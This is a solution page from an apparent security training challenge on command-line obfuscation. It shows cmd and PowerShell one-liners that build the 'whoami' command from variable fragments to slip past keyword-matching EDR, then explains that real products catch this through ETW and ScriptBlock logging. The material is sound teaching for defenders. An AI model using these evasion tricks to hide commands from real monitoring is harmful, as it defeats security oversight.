---
title: "Solution 07: Environment Variable Substitution"
difficulty: medium
category: "Command Line Obfuscation"
---

[Back to Challenge]({{ '/challenges/07-env-variable-substitution/' | relative_url }})

## Overview

Environment variables in the command line are stored unexpanded. The EDR sees `%COMSPEC%`, not `C:\WINDOWS\system32\cmd.exe`.

## Solution

```cmd
:: Build "whoami" from environment variable substrings
:: %COMSPEC% = C:\WINDOWS\system32\cmd.exe

:: Using cmd.exe set and call
cmd.exe /c "set a=who&& set b=ami&& call %a%%b%"

:: Using PowerShell string operations
powershell -c "$a='wh'; $b='oami'; & \"$a$b\""

:: Using variable substring extraction
cmd.exe /V:ON /c "set cmd=whoami&& !cmd!"
```

## Why It Works

The EDR reads the raw command line string from the PEB. Environment variables and command-line variable expressions are stored as-is (unexpanded). They are only expanded at runtime by the shell interpreter.

The EDR has no environment variable resolution engine. It searches for literal keyword strings and misses anything constructed at runtime.

## Real-World Relevance

Real EDR products integrate with ETW (Event Tracing for Windows) which logs the **expanded** command line after variable substitution, or they use ScriptBlock logging for PowerShell which captures the actual executed code.
